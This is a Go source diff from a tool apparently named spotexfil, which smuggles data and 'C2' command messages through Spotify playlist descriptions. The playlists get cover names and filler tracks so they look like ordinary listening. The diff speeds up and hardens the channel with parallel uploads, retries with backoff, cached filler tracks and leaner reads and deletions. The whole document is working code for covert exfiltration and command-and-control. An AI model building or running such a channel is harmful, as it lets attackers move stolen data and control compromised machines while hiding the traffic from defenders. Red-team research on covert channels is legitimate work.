@@ -12,6 +12,7 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/sourcefrenchy/spotexfil/internal/protocol"
@@ -26,6 +27,27 @@ type Client struct {
 	api           *spotifyapi.Client
 	userID        string
 	useCoverNames bool
+
+	// Filler track cache: artist search + top tracks are resolved once
+	// per process, then reused for every playlist (3 API calls saved
+	// per playlist created).
+	fillerMu     sync.Mutex
+	fillerTracks []spotifyapi.ID
+	fillerTried  bool
+}
+
+// Parallel playlist write settings. 4 workers with per-chunk pacing
+// stays well under the Spotify rate limit (~180 req/30s) while cutting
+// large-payload send time roughly 4x.
+const (
+	writeWorkers  = 4
+	writeAttempts = 3
+)
+
+// playlistSpec is a single playlist to create.
+type playlistSpec struct {
+	name string
+	desc string
 }
 
 // spotipy cache file format
@@ -270,7 +292,93 @@ func GenerateCoverName() string {
 	return fmt.Sprintf("%s #%s", name, string(suffix))
 }
 
+// retryAfterFromErr extracts a server-provided backoff (seconds) from a
+// Spotify rate-limit error, or 0 if not present.
+func retryAfterFromErr(err error) int {
+	if err == nil {
+		return 0
+	}
+	s := err.Error()
+	if idx := strings.Index(s, "after:"); idx >= 0 {
+		rest := strings.TrimSpace(s[idx+6:])
+		rest = strings.TrimSuffix(rest, " s")
+		rest = strings.TrimSuffix(rest, "s")
+		fields := strings.Fields(rest)
+		if len(fields) > 0 {
+			var n int
+			if _, err := fmt.Sscanf(fields[0], "%d", &n); err == nil {
+				return n
+			}
+		}
+	}
+	return 0
+}
+
+// createPlaylistWithRetry creates a single playlist (plus filler tracks),
+// retrying on failure with server-provided or exponential backoff.
+func (c *Client) createPlaylistWithRetry(ctx context.Context, spec playlistSpec) error {
+	var err error
+	for attempt := 1; attempt <= writeAttempts; attempt++ {
+		var playlist *spotifyapi.FullPlaylist
+		playlist, err = c.api.CreatePlaylistForUser(ctx, c.userID,
+			spec.name, spec.desc, false, false)
+		if err == nil {
+			c.addFillerTracks(ctx, playlist.ID)
+			return nil
+		}
+		// Honor server-provided backoff, else exponential
+		wait := time.Duration(attempt*attempt) * time.Second
+		if ra := retryAfterFromErr(err); ra > 0 {
+			wait = time.Duration(ra) * time.Second
+		}
+		select {
+		case <-ctx.Done():
+			return ctx.Err()
+		case <-time.After(wait):
+		}
+	}
+	return err
+}
+
+// writePlaylistsParallel creates playlists concurrently with a bounded
+// worker pool. All chunks are attempted even if some fail. Returns the
+// number of playlists that failed after all retries.
+func (c *Client) writePlaylistsParallel(ctx context.Context, specs []playlistSpec) int {
+	work := make(chan int)
+	var wg sync.WaitGroup
+	var failMu sync.Mutex
+	failures := 0
+
+	for w := 0; w < writeWorkers; w++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			for idx := range work {
+				spec := specs[idx]
+				if err := c.createPlaylistWithRetry(ctx, spec); err != nil {
+					failMu.Lock()
+					failures++
+					failMu.Unlock()
+					fmt.Printf("[!] Failed [%d/%d] %s: %v\n",
+						idx+1, len(specs), spec.name, err)
+				} else {
+					fmt.Printf("\t[*] Created [%d/%d] %s\n",
+						idx+1, len(specs), spec.name)
+				}
+				time.Sleep(100 * time.Millisecond) // pacing
+			}
+		}()
+	}
+	for i := range specs {
+		work <- i
+	}
+	close(work)
+	wg.Wait()
+	return failures
+}
+
 // WriteChunks writes payload chunks as playlists with cover names and metadata markers.
+// Chunks are uploaded in parallel (bounded worker pool) with per-chunk retries.
 func (c *Client) WriteChunks(ctx context.Context, payload string) error {
 	if len(payload) > shared.Proto.Transport.MaxPayloadSize {
 		return fmt.Errorf("payload too large: %d bytes", len(payload))
@@ -296,32 +404,26 @@ func (c *Client) WriteChunks(ctx context.Context, payload string) error {
 
 	fmt.Println("[*] Generating playlists")
 
+	specs := make([]playlistSpec, len(chunks))
 	for idx, chunk := range chunks {
 		i := idx + 1
-		var playlistName, description string
-
 		if c.useCoverNames {
-			playlistName = GenerateCoverName()
 			meta, _ := json.Marshal(map[string]int{"i": i})
-			description = chunk + markerSep + string(meta)
+			specs[idx] = playlistSpec{
+				name: GenerateCoverName(),
+				desc: chunk + markerSep + string(meta),
+			}
 		} else {
-			playlistName = fmt.Sprintf("%d-payloadChunk", i)
-			description = chunk
+			specs[idx] = playlistSpec{
+				name: fmt.Sprintf("%d-payloadChunk", i),
+				desc: chunk,
+			}
 		}
+	}
 
-		playlist, err := c.api.CreatePlaylistForUser(ctx, c.userID,
-			playlistName, description, false, false)
-		if err != nil {
-			return fmt.Errorf("create playlist: %w", err)
-		}
-
-		fmt.Printf("\t[*] Created [%d/%d] %s (%d chars)\n",
-			i, len(chunks), playlistName, len(chunk))
-
-		// Add filler tracks
-		c.addFillerTracks(ctx, playlist.ID)
-
-		time.Sleep(100 * time.Millisecond)
+	failures := c.writePlaylistsParallel(ctx, specs)
+	if failures > 0 {
+		return fmt.Errorf("%d of %d playlists failed to upload", failures, len(specs))
 	}
 
 	fmt.Printf("[*] Data encoded and sent (%d playlists)\n", len(chunks))
@@ -329,6 +431,9 @@ func (c *Client) WriteChunks(ctx context.Context, payload string) error {
 }
 
 // ReadChunks retrieves and reassembles payload from playlists.
+// Optimized: uses the description from the playlist listing (1 API call
+// per page) and only fetches full playlist details as a fallback when
+// the listing description is empty.
 func (c *Client) ReadChunks(ctx context.Context) (string, error) {
 	fmt.Println("[*] Retrieving playlists")
 	markerSep := shared.Proto.Transport.MarkerSep
@@ -346,13 +451,18 @@ func (c *Client) ReadChunks(ctx context.Context) (string, error) {
 	var payloadChunks []indexedChunk
 
 	for _, p := range playlists {
-		full, err := c.api.GetPlaylist(ctx, p.ID)
-		if err != nil {
-			return "", fmt.Errorf("get playlist %s: %w", p.ID, err)
-		}
-
 		name := p.Name
-		desc := html.UnescapeString(full.Description)
+		desc := html.UnescapeString(p.Description)
+
+		// Fallback: fetch full details only if the listing has no
+		// description (some accounts omit it from the listing).
+		if desc == "" {
+			full, err := c.api.GetPlaylist(ctx, p.ID)
+			if err != nil {
+				return "", fmt.Errorf("get playlist %s: %w", p.ID, err)
+			}
+			desc = html.UnescapeString(full.Description)
+		}
 
 		isPayload := false
 		chunkIndex := 0
@@ -384,7 +494,7 @@ func (c *Client) ReadChunks(ctx context.Context) (string, error) {
 		}
 	}
 
-	// Sort by index
+	// Sort by index (bubble sort)
 	for i := 0; i < len(payloadChunks); i++ {
 		for j := i + 1; j < len(payloadChunks); j++ {
 			if payloadChunks[j].index < payloadChunks[i].index {
@@ -403,6 +513,8 @@ func (c *Client) ReadChunks(ctx context.Context) (string, error) {
 }
 
 // DeleteChunks deletes all payload playlists.
+// Optimized: filters by marker using the listing description, fetching
+// full details only as a fallback for empty descriptions.
 func (c *Client) DeleteChunks(ctx context.Context) error {
 	markerSep := shared.Proto.Transport.MarkerSep
 	playlists, err := c.GetAllPlaylists(ctx)
@@ -420,11 +532,15 @@ func (c *Client) DeleteChunks(ctx context.Context) error {
 			continue
 		}
 
-		full, err := c.api.GetPlaylist(ctx, p.ID)
-		if err != nil {
-			continue
+		desc := html.UnescapeString(p.Description)
+		if desc == "" {
+			// Fallback for accounts where the listing omits descriptions
+			full, err := c.api.GetPlaylist(ctx, p.ID)
+			if err != nil {
+				continue
+			}
+			desc = html.UnescapeString(full.Description)
 		}
-		desc := full.Description
 		if strings.Contains(desc, markerSep) {
 			if err := c.api.UnfollowPlaylist(ctx, p.ID); err == nil {
 				count++
@@ -437,18 +553,16 @@ func (c *Client) DeleteChunks(ctx context.Context) error {
 }
 
 // WriteC2Playlists writes C2 message chunks as playlists.
+// Chunks are uploaded in parallel (bounded worker pool) with per-chunk retries.
 func (c *Client) WriteC2Playlists(ctx context.Context, encryptedDescs []string) error {
-	for _, description := range encryptedDescs {
-		name := GenerateCoverName()
+	specs := make([]playlistSpec, len(encryptedDescs))
+	for i, desc := range encryptedDescs {
+		specs[i] = playlistSpec{name: GenerateCoverName(), desc: desc}
+	}
 
-		playlist, err := c.api.CreatePlaylistForUser(ctx, c.userID,
-			name, description, false, false)
-		if err != nil {
-			return fmt.Errorf("create playlist: %w", err)
-		}
-
-		c.addFillerTracks(ctx, playlist.ID)
-		time.Sleep(100 * time.Millisecond)
+	failures := c.writePlaylistsParallel(ctx, specs)
+	if failures > 0 {
+		return fmt.Errorf("%d of %d C2 playlists failed to upload", failures, len(specs))
 	}
 	return nil
 }
@@ -516,32 +630,64 @@ func (c *Client) CleanC2Playlists(ctx context.Context, channel, encryptionKey st
 	return nil
 }
 
-// addFillerTracks adds random filler tracks to a playlist for cover.
-func (c *Client) addFillerTracks(ctx context.Context, playlistID spotifyapi.ID) {
+// resolveFillerTracks fetches filler track IDs once and caches them for
+// the lifetime of the process. Before this cache, every playlist created
+// cost 3 extra API calls (search + top tracks + add tracks).
+func (c *Client) resolveFillerTracks(ctx context.Context) []spotifyapi.ID {
+	c.fillerMu.Lock()
+	defer c.fillerMu.Unlock()
+
+	if c.fillerTried {
+		return c.fillerTracks
+	}
+	c.fillerTried = true
+
+	if c.api == nil {
+		return nil
+	}
+
 	artists := shared.Proto.Transport.FillerArtists
 	artist := artists[rand.Intn(len(artists))]
 
 	results, err := c.api.Search(ctx, fmt.Sprintf("artist:%s", artist),
 		spotifyapi.SearchTypeArtist, spotifyapi.Limit(1))
 	if err != nil || len(results.Artists.Artists) == 0 {
-		return
+		return nil
 	}
 
 	artistID := results.Artists.Artists[0].ID
 	topTracks, err := c.api.GetArtistsTopTracks(ctx, artistID, "US")
 	if err != nil || len(topTracks) == 0 {
+		return nil
+	}
+
+	ids := make([]spotifyapi.ID, 0, len(topTracks))
+	for _, t := range topTracks {
+		ids = append(ids, t.ID)
+	}
+	c.fillerTracks = ids
+	return ids
+}
+
+// addFillerTracks adds a random subset of the cached filler tracks to a
+// playlist for cover.
+func (c *Client) addFillerTracks(ctx context.Context, playlistID spotifyapi.ID) {
+	ids := c.resolveFillerTracks(ctx)
+	if len(ids) == 0 {
 		return
 	}
 
+	// Shuffle a copy so concurrent writers don't race on the cache
+	shuffled := make([]spotifyapi.ID, len(ids))
+	copy(shuffled, ids)
+	rand.Shuffle(len(shuffled), func(i, j int) {
+		shuffled[i], shuffled[j] = shuffled[j], shuffled[i]
+	})
+
 	count := 5
-	if len(topTracks) < count {
-		count = len(topTracks)
+	if len(shuffled) < count {
+		count = len(shuffled)
 	}
 
-	trackIDs := make([]spotifyapi.ID, count)
-	for i := 0; i < count; i++ {
-		trackIDs[i] = topTracks[i].ID
-	}
-
-	_, _ = c.api.AddTracksToPlaylist(ctx, playlistID, trackIDs...)
+	_, _ = c.api.AddTracksToPlaylist(ctx, playlistID, shuffled[:count]...)
 }
